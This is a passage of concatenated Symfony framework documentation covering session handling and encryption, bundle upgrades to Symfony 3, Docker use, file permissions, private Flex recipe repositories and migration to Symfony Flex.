            private RequestStack $requestStack,
        ) {
        }

        public function onLoginSuccess(LoginSuccessEvent $event): void
        {
            $user = $event->getUser();

            if (null !== $user->getLocale()) {
                $this->requestStack->getSession()->set('_locale', $user->getLocale());
            }
        }

        public static function getSubscribedEvents(): array
        {
            return [
                LoginSuccessEvent::class => 'onLoginSuccess',
            ];
        }
    }

.. caution::

    In order to update the language immediately after a user has changed their
    language preferences, you also need to update the session when you change
    the ``User`` entity.

Session Proxies
---------------

The session proxy mechanism has a variety of uses and this article demonstrates
two common ones. Rather than using the regular session handler, you can create
a custom save handler by defining a class that extends the
:class:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Proxy\\SessionHandlerProxy`
class.

Then, define the class as a :ref:`service
<service-container-creating-service>`. If you're using the :ref:`default
services.yaml configuration <service-container-services-load-example>`, that
happens automatically.

Finally, use the ``framework.session.handler_id`` configuration option to tell
Symfony to use your session handler instead of the default one:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            session:
                # ...
                handler_id: App\Session\CustomSessionHandler

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <framework:config>
                <framework:session handler-id="App\Session\CustomSessionHandler"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use App\Session\CustomSessionHandler;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->session()
                ->handlerId(CustomSessionHandler::class)
            ;
        };

Keep reading the next sections to learn how to use the session handlers in
practice to solve two common use cases: encrypt session information and define
read-only guest sessions.

Encryption of Session Data
~~~~~~~~~~~~~~~~~~~~~~~~~~

If you want to encrypt the session data, you can use the proxy to encrypt and
decrypt the session as required. The following example uses the `php-encryption`_
library, but you can adapt it to any other library that you may be using::

    // src/Session/EncryptedSessionProxy.php
    namespace App\Session;

    use Defuse\Crypto\Crypto;
    use Defuse\Crypto\Key;
    use Symfony\Component\HttpFoundation\Session\Storage\Proxy\SessionHandlerProxy;

    class EncryptedSessionProxy extends SessionHandlerProxy
    {
        public function __construct(
            private \SessionHandlerInterface $handler,
            private Key $key
        ) {
            parent::__construct($handler);
        }

        public function read($id): string
        {
            $data = parent::read($id);

            return Crypto::decrypt($data, $this->key);
        }

        public function write($id, $data): string
        {
            $data = Crypto::encrypt($data, $this->key);

            return parent::write($id, $data);
        }
    }

Another possibility to encrypt session data is to decorate the
``session.marshaller`` service, which points out to
:class:`Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MarshallingSessionHandler`.
You can decorate this handler with a marshaller that uses encryption,
like the :class:`Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller`.

First, you need to generate a secure key and add it to your :doc:`secret
store </configuration/secrets>` as ``SESSION_DECRYPTION_FILE``:

.. code-block:: terminal

    $ php -r 'echo base64_encode(sodium_crypto_box_keypair());'

Then, register the ``SodiumMarshaller`` service using this key:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:

            # ...
            Symfony\Component\Cache\Marshaller\SodiumMarshaller:
                decorates: 'session.marshaller'
                arguments:
                    - ['%env(file:resolve:SESSION_DECRYPTION_FILE)%']
                    - '@.inner'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <services>
                <service id="Symfony\Component\Cache\Marshaller\SodiumMarshaller" decorates="session.marshaller">
                    <argument type="collection">
                        <argument>env(file:resolve:SESSION_DECRYPTION_FILE)</argument>
                    </argument>
                    <argument type="service" id=".inner"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use Symfony\Component\Cache\Marshaller\SodiumMarshaller;
        use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
        // ...

        return function(ContainerConfigurator $container) {
            $services = $container->services();

            // ...

            $services->set(SodiumMarshaller::class)
                ->decorate('session.marshaller')
                ->args([
                    [env('file:resolve:SESSION_DECRYPTION_FILE')],
                    service('.inner'),
                ]);
        };

.. danger::

    This will encrypt the values of the cache items, but not the cache keys. Be
    careful not to leak sensitive data in the keys.

Read-only Guest Sessions
~~~~~~~~~~~~~~~~~~~~~~~~

There are some applications where a session is required for guest users, but
where there is no particular need to persist the session. In this case you can
intercept the session before it is written::

    // src/Session/ReadOnlySessionProxy.php
    namespace App\Session;

    use App\Entity\User;
    use Symfony\Bundle\SecurityBundle\Security;
    use Symfony\Component\HttpFoundation\Session\Storage\Proxy\SessionHandlerProxy;

    class ReadOnlySessionProxy extends SessionHandlerProxy
    {
        public function __construct(
            private \SessionHandlerInterface $handler,
            private Security $security
        ) {
            parent::__construct($handler);
        }

        public function write($id, $data): string
        {
            if ($this->getUser() && $this->getUser()->isGuest()) {
                return;
            }

            return parent::write($id, $data);
        }

        private function getUser(): ?User
        {
            $user = $this->security->getUser();
            if (is_object($user)) {
                return $user;
            }

            return null;
        }
    }

.. _session-avoid-start:

Integrating with Legacy Applications
------------------------------------

If you're integrating the Symfony full-stack Framework into a legacy
application that starts the session with ``session_start()``, you may still be
able to use Symfony's session management by using the PHP Bridge session.

If the application has its own PHP save handler, you can specify ``null``
for the ``handler_id``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            session:
                storage_factory_id: session.storage.factory.php_bridge
                handler_id: ~

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <framework:config>
                <framework:session storage-factory-id="session.storage.factory.php_bridge"
                    handler-id="null"
                />
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->session()
                ->storageFactoryId('session.storage.factory.php_bridge')
                ->handlerId(null)
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\HttpFoundation\Session\Session;
        use Symfony\Component\HttpFoundation\Session\Storage\PhpBridgeSessionStorage;

        // legacy application configures session
        ini_set('session.save_handler', 'files');
        ini_set('session.save_path', '/tmp');
        session_start();

        // Get Symfony to interface with this existing session
        $session = new Session(new PhpBridgeSessionStorage());

        // symfony will now interface with the existing PHP session
        $session->start();

Otherwise, if the problem is that you cannot avoid the application
starting the session with ``session_start()``, you can still make use of
a Symfony based session save handler by specifying the save handler as in
the example below:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            session:
                storage_factory_id: session.storage.factory.php_bridge
                handler_id: session.handler.native_file

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <framework:config>
                <framework:session storage-id="session.storage.php_bridge"
                    handler-id="session.storage.native_file"
                />
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->session()
                ->storageFactoryId('session.storage.factory.php_bridge')
                ->handlerId('session.storage.native_file')
            ;
        };

.. note::

    If the legacy application requires its own session save handler, do not
    override this. Instead set ``handler_id: ~``. Note that a save handler
    cannot be changed once the session has been started. If the application
    starts the session before Symfony is initialized, the save handler will
    have already been set. In this case, you will need ``handler_id: ~``.
    Only override the save handler if you are sure the legacy application
    can use the Symfony save handler without side effects and that the session
    has not been started before Symfony is initialized.

.. _`phpredis extension`: https://github.com/phpredis/phpredis
.. _`DoctrineMongoDBBundle configuration`: https://symfony.com/doc/master/bundles/DoctrineMongoDBBundle/config.html
.. _`MongoDB shell`: https://docs.mongodb.com/manual/mongo/
.. _`php-encryption`: https://github.com/defuse/php-encryption
Upgrading a Third-Party Bundle for a Major Symfony Version
==========================================================

Symfony 3 was released in November 2015. Although this version doesn't contain
any new features, it removes all the backward compatibility layers included in
the previous 2.8 version. If your bundle uses any deprecated feature and it's
published as a third-party bundle, applications upgrading to Symfony 3 will no
longer be able to use it.

Allowing to Install Symfony 3 Components
----------------------------------------

Most third-party bundles define their Symfony dependencies using the ``~2.N`` or
``^2.N`` constraints in the ``composer.json`` file. For example:

.. code-block:: json

    {
        "require": {
            "symfony/framework-bundle": "~2.7",
            "symfony/finder": "~2.7",
            "symfony/validator": "~2.7"
        }
    }

These constraints prevent the bundle from using Symfony 3 components, which
means the bundle cannot be installed in a Symfony 3 based application. Thanks to the
flexibility of Composer dependencies constraints, you can specify more than one
major version by replacing ``~2.N`` by ``~2.N|~3.0`` (or ``^2.N`` by ``^2.N|~3.0``).

The above example can be updated to work with Symfony 3 as follows:

.. code-block:: json

    {
        "require": {
            "symfony/framework-bundle": "~2.7|~3.0",
            "symfony/finder": "~2.7|~3.0",
            "symfony/validator": "~2.7|~3.0"
        }
    }

.. tip::

    Another common version constraint found on third-party bundles is ``>=2.N``.
    You should avoid using that constraint because it's too generic (it means
    that your bundle is compatible with any future Symfony version). Use instead
    ``~2.N|~3.0`` or ``^2.N|~3.0`` to make your bundle future-proof.

Look for Deprecations and Fix Them
----------------------------------

Besides allowing users to use your bundle with Symfony 3, your bundle must stop using
any feature deprecated by the 2.8 version because they are removed in 3.0 (you'll get
exceptions or PHP errors). The easiest way to detect deprecations is to install
the `symfony/phpunit-bridge package`_ and then run the test suite.

First, install the component as a ``dev`` dependency of your bundle:

.. code-block:: terminal

    $ composer require --dev symfony/phpunit-bridge

Then, run your test suite and look for the deprecation list displayed after the
PHPUnit test report:

.. code-block:: terminal

    # this command is available after running "composer require --dev symfony/phpunit-bridge"
    $ ./bin/phpunit

    # ... PHPUnit output

    Remaining deprecation notices (3)

    The "pattern" option in file ... is deprecated since version 2.2 and will be
    removed in 3.0. Use the "path" option in the route definition instead ...

    Twig Function "form_enctype" is deprecated. Use "form_start" instead in ...

    The Symfony\Bundle\SecurityBundle\SecurityContext class is deprecated since
    version 2.6 and will be removed in 3.0. Use ...

Fix the reported deprecations, run the test suite again and repeat the process
until no deprecation usage is reported.

Useful Resources
~~~~~~~~~~~~~~~~

There are several resources that can help you detect, understand and fix the use
of deprecated features:

`Official Symfony Guide to Upgrade from 2.x to 3.0`_
    The full list of changes required to upgrade to Symfony 3.0 and grouped
    by component.
`SensioLabs DeprecationDetector`_
    It runs a static code analysis against your project's source code to find
    usages of deprecated methods, classes and interfaces. It works for any PHP
    application, but it includes special detectors for Symfony applications,
    where it can also detect usages of deprecated services.
`Symfony Upgrade Fixer`_
    It analyzes Symfony projects to find deprecations. In addition it solves
    automatically some of them thanks to the growing list of supported "fixers".

Testing your Bundle in Symfony 3
--------------------------------

Now that your bundle has removed all deprecations, it's time to test it for real
in a Symfony 3 application. Assuming that you already have a Symfony 3 application,
you can test the updated bundle locally without having to install it through
Composer.

If your operating system supports symbolic links, instead point the appropriate
vendor directory to your local bundle root directory:

.. code-block:: terminal

    $ ln -s /path/to/your/local/bundle/ vendor/you-vendor-name/your-bundle-name

If your operating system doesn't support symbolic links, you'll need to copy
your local bundle directory into the appropriate directory inside ``vendor/``.

Update the Travis CI Configuration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In addition to running tools locally, it's recommended to set-up Travis CI service
to run the tests of your bundle using different Symfony configurations. Use the
following recommended configuration as the starting point of your own configuration:

.. code-block:: yaml

    language: php
    php:
        - 5.3
        - 5.6
        - 7.0

    matrix:
        include:
            - php: 5.3.3
              env: COMPOSER_FLAGS='--prefer-lowest --prefer-stable' SYMFONY_DEPRECATIONS_HELPER=max[total]=999999
            - php: 5.6
              env: SYMFONY_VERSION='2.7.*'
            - php: 5.6
              env: SYMFONY_VERSION='2.8.*'
            - php: 5.6
              env: SYMFONY_VERSION='3.0.*'
            - php: 5.6
              env: SYMFONY_VERSION='3.1.*'
            - php: 5.6
              env: DEPENDENCIES='dev' SYMFONY_VERSION='3.2.*@dev'

    before_install:
        - composer self-update
        - if [ "$DEPENDENCIES" == "dev" ]; then perl -pi -e 's/^}$/,"minimum-stability":"dev"}/' composer.json; fi;
        - if [ "$SYMFONY_VERSION" != "" ]; then composer --no-update require symfony/symfony:${SYMFONY_VERSION}; fi;

    install: composer update $COMPOSER_FLAGS

    script: phpunit

Updating your Code to Support Symfony 2.x and 3.x at the Same Time
------------------------------------------------------------------

The real challenge of adding Symfony 3 support for your bundles is when you want
to support both Symfony 2.x and 3.x simultaneously using the same code. There
are some edge cases where you'll need to deal with the API differences.

Before diving into the specifics of the most common edge cases, the general
recommendation is to **not rely on the Symfony Kernel version** to decide which
code to use::

    if (Kernel::VERSION_ID < 20800) {
        // code for Symfony 2.x
    } else {
        // code for Symfony 3.x
    }

Instead of checking the Symfony Kernel version, check the version of the specific
component. For example, the OptionsResolver API changed in its 2.6 version by
adding a ``setDefined()`` method. The recommended check in this case would be::

    use Symfony\Component\OptionsResolver\OptionsResolver;

    if (!method_exists(OptionsResolver::class, 'setDefined')) {
        // code for the old OptionsResolver API
    } else {
        // code for the new OptionsResolver API
    }

.. tip::

    There is one case when you actually can rely on the
    ``Symfony\Component\HttpKernel\Kernel::VERSION_ID`` constant: when trying
    to detect the version of the ``symfony/http-kernel`` component, because it
    is the component where this constant is defined.

.. _`symfony/phpunit-bridge package`: https://github.com/symfony/phpunit-bridge
.. _`Official Symfony Guide to Upgrade from 2.x to 3.0`: https://github.com/symfony/symfony/blob/2.8/UPGRADE-3.0.md
.. _`SensioLabs DeprecationDetector`: https://github.com/sensiolabs-de/deprecation-detector
.. _`Symfony Upgrade Fixer`: https://github.com/umpirsky/Symfony-Upgrade-Fixer
Using Docker with Symfony
=========================

Can you use Docker with Symfony? Of course! And several tools exist to help,
depending on your needs.

Complete Docker Environment
---------------------------

If you'd like a complete Docker environment (i.e. where PHP, web server, database,
etc. are all in Docker), check out `https://github.com/dunglas/symfony-docker`_.

Alternatively, you can install PHP on your local machine and use the
:ref:`symfony binary Docker integration <symfony-server-docker>`. In both cases,
you can take advantage of automatic Docker configuration from :ref:`Symfony Flex <symfony-flex>`.

Flex Recipes & Docker Configuration
-----------------------------------

The :ref:`Flex recipe <symfony-flex>` for some packages also include Docker configuration.
For example, when you run ``composer require doctrine`` (to get ``symfony/orm-pack``),
your ``compose.yaml`` file will automatically be updated to include a
``database`` service.

The first time you install a recipe containing Docker config, Flex will ask you
if you want to include it. Or, you can set your preference in ``composer.json``,
by setting the ``extra.symfony.docker`` config to ``true`` or ``false``.

Some recipes also include additions to your ``Dockerfile``. To get those changes,
you need to already have a ``Dockerfile`` at the root of your app *with* the
following code somewhere inside:

.. code-block:: text

    ###> recipes ###
    ###< recipes ###

The recipe will find this section and add the changes inside. If you're using
`https://github.com/dunglas/symfony-docker`_, you'll already have this.

After installing the package, rebuild your containers by running:

.. code-block:: terminal

    $ docker-compose up --build

Symfony Binary Web Server and Docker Support
--------------------------------------------

If you're using the :ref:`symfony binary web server <symfony-local-web-server>` (e.g. ``symfony server:start``),
then it can automatically detect your Docker services and expose them as environment
variables. See :ref:`symfony-server-docker`.

.. note::

    macOS users need to explicitly allow the default Docker socket to be used
    for the Docker integration to work `as explained in the Docker documentation`_.

.. _`https://github.com/dunglas/symfony-docker`: https://github.com/dunglas/symfony-docker
.. _`as explained in the Docker documentation`: https://docs.docker.com/desktop/mac/permission-requirements/
Setting up or Fixing File Permissions
=====================================

Symfony generates certain files in the ``var/`` directory of your project when
running the application. In the ``dev`` :ref:`environment <configuration-environments>`,
the ``bin/console`` and ``public/index.php`` files use ``umask()`` to make sure
that the directory is writable. This means that you don't need to configure
permissions when developing the application in your local machine.

However, using ``umask()`` is not considered safe in production. That's why you
often need to configure some permissions explicitly in your production servers
as explained in this article.

Permissions Required by Symfony Applications
--------------------------------------------

These are the permissions required to run Symfony applications:

* The ``var/log/`` directory must exist and must be writable by both your
  web server user and the terminal user;
* The ``var/cache/`` directory must be writable by the terminal user (the
  user running ``cache:warmup`` or ``cache:clear`` commands);
* The ``var/cache/`` directory must be writable by the web server user if you use
  a :doc:`filesystem-based cache </components/cache/adapters/filesystem_adapter>`.

.. _setup-file-permissions:

Configuring Permissions for Symfony Applications
------------------------------------------------

On Linux and macOS systems, if your web server user is different from your
command line user, you need to configure permissions properly to avoid issues.
There are several ways to achieve that:

1. Using ACL on a System that Supports ``setfacl`` (Linux/BSD)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Using Access Control Lists (ACL) permissions is the most safe and
recommended method to make the ``var/`` directory writable. You may need to
install ``setfacl`` and `enable ACL support`_ on your disk partition before
using this method. Then, use the following script to determine your web
server user and grant the needed permissions:

.. code-block:: terminal

    $ HTTPDUSER=$(ps axo user,comm | grep -E '[a]pache|[h]ttpd|[_]www|[w]ww-data|[n]ginx' | grep -v root | head -1 | cut -d\  -f1)

    # if the following commands don't work, try adding `-n` option to `setfacl`

    # set permissions for future files and folders
    $ sudo setfacl -dR -m u:"$HTTPDUSER":rwX -m u:$(whoami):rwX var
    # set permissions on the existing files and folders
    $ sudo setfacl -R -m u:"$HTTPDUSER":rwX -m u:$(whoami):rwX var

Both of these commands assign permissions for the system user (the one
running these commands) and the web server user.

.. note::

    ``setfacl`` isn't available on NFS mount points. However, storing cache and
    logs over NFS is strongly discouraged for performance reasons.

2. Use the same User for the CLI and the Web Server
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Edit your web server configuration (commonly ``httpd.conf`` or ``apache2.conf``
for Apache) and set its user to be the same as your CLI user (e.g. for Apache,
update the ``User`` and ``Group`` directives).

.. caution::

    If this solution is used in a production server, be sure this user only has
    limited privileges (no access to private data or servers, execution of
    unsafe binaries, etc.) as a compromised server would give to the hacker
    those privileges.

3. Without Using ACL
~~~~~~~~~~~~~~~~~~~~

If none of the previous methods work for you, change the ``umask`` so that the
cache and log directories are group-writable or world-writable (depending
if the web server user and the command line user are in the same group or not).
To achieve this, put the following line at the beginning of the ``bin/console``,
and ``public/index.php`` files::

    umask(0002); // This will let the permissions be 0775

    // or

    umask(0000); // This will let the permissions be 0777

.. caution::

    Changing the ``umask`` is not thread-safe, so the ACL methods are recommended
    when they are available.

.. _`enable ACL support`: https://help.ubuntu.com/community/FilePermissionsACLs
How To Configure and Use Flex Private Recipe Repositories
=========================================================

Since the `release of version 1.16`_ of ``symfony/flex``, you can build your own
private Symfony Flex recipe repositories, and seamlessly integrate them into the
``composer`` package installation and maintenance process.

This is particularly useful when you have private bundles or packages that must
perform their own installation tasks. To do this, you need to complete several steps:

* Create a private repository;
* Create your private recipes;
* Create an index to the recipes;
* Store your recipes in the private repository;
* Grant ``composer`` access to the private repository;
* Configure your project's ``composer.json`` file; and
* Install the recipes in your project.

.. _create-a-private-github-repository:

Create a Private Repository
---------------------------

GitHub
~~~~~~

Log in to your GitHub.com account, click your account icon in the top-right
corner, and select **Your Repositories**. Then click the **New** button, fill in
the **repository name**, select the **Private** radio button, and click the
**Create Repository** button.

Gitlab
~~~~~~

Log in to your Gitlab.com account, click the **New project** button, select
**Create blank project**, fill in the **Project name**, select the **Private**
radio button, and click the **Create project** button.

Create Your Private Recipes
---------------------------

A ``symfony/flex`` recipe is a JSON file that has the following structure:

.. code-block:: json

    {
        "manifests": {
            "acme/package-name": {
                "manifest": {
                },
                "ref": "7405f3af1312d1f9121afed4dddef636c6c7ff00"
            }
        }
    }

If your package is a private Symfony bundle, you will have the following in the recipe:

.. code-block:: json

    {
        "manifests": {
            "acme/private-bundle": {
                "manifest": {
                    "bundles": {
                        "Acme\\PrivateBundle\\AcmePrivateBundle": [
                            "all"
                        ]
                    }
                },
                "ref": "7405f3af1312d1f9121afed4dddef636c6c7ff00"
            }
        }
    }

Replace ``acme`` and ``private-bundle`` with your own private bundle details.
The ``"ref"`` entry is a random 40-character string used by ``composer`` to
determine if your recipe was modified. Every time that you make changes to your
recipe, you also need to generate a new ``"ref"`` value.

.. tip::

    Use the following PHP script to generate a random ``"ref"`` value::

        echo bin2hex(random_bytes(20));

The ``"all"`` entry tells ``symfony/flex`` to create an entry in your project's
``bundles.php`` file for all environments. To load your bundle only for the
``dev`` environment, replace ``"all"`` with ``"dev"``.

The name of your recipe JSON file must conform to the following convention,
where ``1.0`` is the version number of your bundle (replace ``acme`` and
``private-bundle`` with your own private bundle or package details):

    ``acme.private-bundle.1.0.json``

You will probably also want ``symfony/flex`` to create configuration files for
your bundle or package in the project's ``/config/packages`` directory. To do
that, change the recipe JSON file as follows:

.. code-block:: json

    {
        "manifests": {
            "acme/private-bundle": {
                "manifest": {
                    "bundles": {
                        "Acme\\PrivateBundle\\AcmePrivateBundle": [
                            "all"
                        ]
                    },
                    "copy-from-recipe": {
                        "config/": "%CONFIG_DIR%"
                    }
                },
                "files": {
                    "config/packages/acme_private.yaml": {
                        "contents": [
                            "acme_private:",
                            "    encode: true",
                            ""
                        ],
                        "executable": false
                    }
                },
                "ref": "7405f3af1312d1f9121afed4dddef636c6c7ff00"
            }
        }
    }

For more examples of what you can include in a recipe file, browse the
`Symfony recipe files`_.

Create an Index to the Recipes
------------------------------

The next step is to create an ``index.json`` file, which will contain entries
for all your private recipes, and other general configuration information.

GitHub
~~~~~~

The ``index.json`` file has the following format:

.. code-block:: json

    {
        "recipes": {
            "acme/private-bundle": [
                "1.0"
            ]
        },
        "branch": "main",
        "is_contrib": true,
        "_links": {
            "repository": "github.com/your-github-account-name/your-recipes-repository",
            "origin_template": "{package}:{version}@github.com/your-github-account-name/your-recipes-repository:main",
            "recipe_template": "https://api.github.com/repos/your-github-account-name/your-recipes-repository/contents/{package_dotted}.{version}.json"
        }
    }

Create an entry in ``"recipes"`` for each of your bundle recipes. Replace
``your-github-account-name`` and ``your-recipes-repository`` with your own details.

Gitlab
~~~~~~

The ``index.json`` file has the following format:

.. code-block:: json

    {
        "recipes": {
            "acme/private-bundle": [
                "1.0"
            ]
        },
        "branch": "main",
        "is_contrib": true,
        "_links": {
            "repository": "gitlab.com/your-gitlab-account-name/your-recipes-repository",
            "origin_template": "{package}:{version}@gitlab.com/your-gitlab-account-name/your-recipes-repository:main",
            "recipe_template": "https://gitlab.com/api/v4/projects/your-gitlab-project-id/repository/files/{package_dotted}.{version}.json/raw?ref=main"
        }
    }

Create an entry in ``"recipes"`` for each of your bundle recipes. Replace
``your-gitlab-account-name``, ``your-gitlab-repository`` and ``your-gitlab-project-id``
with your own details.

Store Your Recipes in the Private Repository
--------------------------------------------

Upload the recipe ``.json`` file(s) and the ``index.json`` file into the root
directory of your private repository.

Grant ``composer`` Access to the Private Repository
---------------------------------------------------

GitHub
~~~~~~

In your GitHub account, click your account icon in the top-right corner, select
``Settings`` and ``Developer Settings``. Then select ``Personal Access Tokens``.

Generate a new access token with ``Full control of private repositories``
privileges. Copy the access token value, switch to the terminal of your local
computer, and execute the following command:

.. code-block:: terminal

    $ composer config --global --auth github-oauth.github.com [token]

Replace ``[token]`` with the value of your GitHub personal access token.

Gitlab
~~~~~~

In your Gitlab account, click your account icon in the top-right corner, select
``Preferences`` and ``Access Tokens``.

Generate a new personal access token with ``read_api`` and ``read_repository``
scopes. Copy the access token value, switch to the terminal of your local
computer, and execute the following command:

.. code-block:: terminal

    $ composer config --global --auth gitlab-token.gitlab.com [token]

Replace ``[token]`` with the value of your Gitlab personal access token.

Configure Your Project's ``composer.json`` File
-----------------------------------------------

GitHub
~~~~~~

Add the following to your project's ``composer.json`` file:

.. code-block:: json

    {
        "extra": {
            "symfony": {
                "endpoint": [
                    "https://api.github.com/repos/your-github-account-name/your-recipes-repository/contents/index.json",
                    "flex://defaults"
                ]
            }
        }
    }

Replace ``your-github-account-name`` and ``your-recipes-repository`` with your own details.

.. tip::

    The ``extra.symfony`` key will most probably already exist in your
    ``composer.json``. In that case, add the ``"endpoint"`` key to the existing
    ``extra.symfony`` entry.

.. tip::

    The ``endpoint`` URL **must** point to ``https://api.github.com/repos`` and
    **not** to ``https://www.github.com``.

Gitlab
~~~~~~

Add the following to your project's ``composer.json`` file:

.. code-block:: json

    {
        "extra": {
            "symfony": {
                "endpoint": [
                    "https://gitlab.com/api/v4/projects/your-gitlab-project-id/repository/files/index.json/raw?ref=main",
                    "flex://defaults"
                ]
            }
        }
    }

Replace ``your-gitlab-project-id`` with your own details.

.. tip::

    The ``extra.symfony`` key will most probably already exist in your
    ``composer.json``. In that case, add the ``"endpoint"`` key to the existing
    ``extra.symfony`` entry.

Install the Recipes in Your Project
-----------------------------------

If your private bundles/packages have not yet been installed in your project,
run the following command:

.. code-block:: terminal

    $ composer update

If the private bundles/packages have already been installed and you just want to
install the new private recipes, run the following command:

.. code-block:: terminal

    $ composer recipes

.. _`release of version 1.16`: https://github.com/symfony/cli
.. _`Symfony recipe files`: https://github.com/symfony/recipes/tree/flex/main
Upgrading Existing Applications to Symfony Flex
===============================================

Using Symfony Flex is optional, even in Symfony 4, where Flex is used by
default. However, Flex is so convenient and improves your productivity so much
that it's strongly recommended to upgrade your existing applications to it.

Symfony Flex recommends that applications use the following directory structure,
which is the same used by default in Symfony 4, but you can
:ref:`customize some directories <flex-customize-paths>`:

.. code-block:: text

    your-project/
    ├── assets/
    ├── bin/
    │   └── console
    ├── config/
    │   ├── bundles.php
    │   ├── packages/
    │   ├── routes.yaml
    │   └── services.yaml
    ├── public/
    │   └── index.php
    ├── src/
    │   ├── ...
    │   └── Kernel.php
    ├── templates/
    ├── tests/
    ├── translations/
    ├── var/
    └── vendor/

This means that installing the ``symfony/flex`` dependency in your application
is not enough. You must also upgrade the directory structure to the one shown
above. There's no automatic tool to make this upgrade, so you must follow these
manual steps:

#. Install Flex as a dependency of your project:

   .. code-block:: terminal

       $ composer require symfony/flex

#. If the project's ``composer.json`` file contains ``symfony/symfony`` dependency,
   it still depends on the Symfony Standard Edition, which is no longer available
   in Symfony 4. First, remove this dependency:

   .. code-block:: terminal

       $ composer remove symfony/symfony

   Now add the ``symfony/symfony`` package to the ``conflict`` section of the project's
   ``composer.json`` file as `shown in this example of the skeleton-project`_ so that
   it will not be installed again:

   .. code-block:: diff

         {
             "require": {
                 "symfony/flex": "^1.0",
       +   },
       +   "conflict": {
       +       "symfony/symfony": "*"
             }
         }

   Now you must add in ``composer.json`` all the Symfony dependencies required
   by your project. A quick way to do that is to add all the components that
   were included in the previous ``symfony/symfony`` dependency and later you
   can remove anything you don't really need:

   .. code-block:: terminal

       $ composer require annotations asset orm twig \
         logger mailer form security translation validator
       $ composer require --dev dotenv maker-bundle orm-fixtures profiler

#. If the project's ``composer.json`` file doesn't contain the ``symfony/symfony``
   dependency, it already defines its dependencies explicitly, as required by
   Flex. Reinstall all dependencies to force Flex to generate the
   configuration files in ``config/``, which is the most tedious part of the upgrade
   process:

   .. code-block:: terminal

       $ rm -rf vendor/*
       $ composer install

#. Regardless of which of the previous steps you followed, at this point you'll have
   lots of new config files in ``config/``. They contain the default config
   defined by Symfony, so you must check your original files in ``app/config/``
   and make the needed changes in the new files. Flex config doesn't use suffixes
   in config files, so the old ``app/config/config_dev.yml`` goes to
   ``config/packages/dev/*.yaml``, etc.

#. The most important config file is ``app/config/services.yml``, which now is
   located at ``config/services.yaml``. Copy the contents of the
   `default services.yaml file`_ and then add your own service configuration.
   Later you can revisit this file because thanks to Symfony's
   :doc:`autowiring feature </service_container/autowiring>` you can remove
   most of the service configuration.

   .. note::

       Make sure that your previous configuration files don't have ``imports``
       declarations pointing to resources already loaded by ``Kernel::configureContainer()``
       or ``Kernel::configureRoutes()`` methods.

#. Move the rest of the ``app/`` contents as follows (and after that, remove the
   ``app/`` directory):

   * ``app/Resources/views/`` -> ``templates/``
   * ``app/Resources/translations/`` -> ``translations/``
   * ``app/Resources/<BundleName>/views/`` -> ``templates/bundles/<BundleName>/``
   * rest of ``app/Resources/`` files -> ``src/Resources/``

#. Move the original PHP source code files from ``src/AppBundle/*``, except bundle
   specific files (like ``AppBundle.php`` and ``DependencyInjection/``), to
   ``src/`` and update the namespace of each moved file to be ``App\...`` (advanced
   IDEs can do this automatically).

   In addition to moving the files, update the ``autoload`` and ``autoload-dev``
   values of the ``composer.json`` file as `shown in this example`_ to use
   ``App\`` and ``App\Tests\`` as the application namespaces.

   If you used multiple bundles to organize your code, you must reorganize your
   code into ``src/``. For example, if you had ``src/UserBundle/Controller/DefaultController.php``
   and ``src/ProductBundle/Controller/DefaultController.php``, you could move
   them to ``src/Controller/UserController.php`` and ``src/Controller/ProductController.php``.

#. Move the public assets, such as images or compiled CSS/JS files, from
   ``src/AppBundle/Resources/public/`` to ``public/`` (e.g. ``public/images/``).

#. Remove ``src/AppBundle/``.

#. Move the source of the assets (e.g. the SCSS files) to ``assets/`` and use
   :doc:`Webpack Encore </frontend>` to manage and compile them.

#. ``SYMFONY_DEBUG`` and ``SYMFONY_ENV`` environment variables were replaced by
